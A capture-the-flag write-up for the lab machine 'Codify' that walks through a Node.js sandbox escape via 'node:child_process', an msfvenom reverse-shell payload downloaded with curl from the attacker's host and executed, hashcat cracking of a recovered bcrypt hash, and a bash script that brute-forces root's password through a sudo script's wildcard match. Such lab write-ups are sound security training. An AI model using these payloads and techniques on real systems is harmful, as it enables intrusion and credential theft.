# Codify

## Shell

The nodejs editor will disallow 'child\_process', but it must be checking for the string as 'node:child\_process' is allowed.  

After trying a sh reverse shell, I uploaded with curl.  

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f elf > shell
```

In the editor.  

```
require('node:child_process').exec('curl http://10.10.14.84:8000/shell -o /tmp/shell');

require('node:child_process').exec('chmod +x /tmp/shell');

require('node:child_process').exec('/tmp/shell');
```

## User

There is a encrypted password in the following database file.  

```
/var/www/contact/tickets.db
```

```
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

Cracking with hashcat.  

```
hashcat.exe -m 3200 -a 0 joshua.txt rockyou.txt
```

Creds

```
spongebob1
```

## root

The following hashes are found in the mysql database.  

```
root:4ECCEBD05161B6782081E970D9D2C72138197218
passbolt:63DA7233CC5151B814CBEC5AF8B3EAC43347A203
```

joshua has sudo priv over the script /opt/scripts/mysql-backup.sh, the wildcard matches any character in bash, so I script a brute force solution for the cred.  

```
#!/bin/bash

letters=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z')
letters+=('0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
letters+=('A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z')

for letter in ${letters[@]};do
  echo "kljh12k3jhaskjh12kjh3$letter"
  echo "kljh12k3jhaskjh12kjh3$letter*" | sudo /opt/scripts/mysql-backup.sh
  sleep 1
done
```

Which gave the final root password.  

```
kljh12k3jhaskjh12kjh3
```
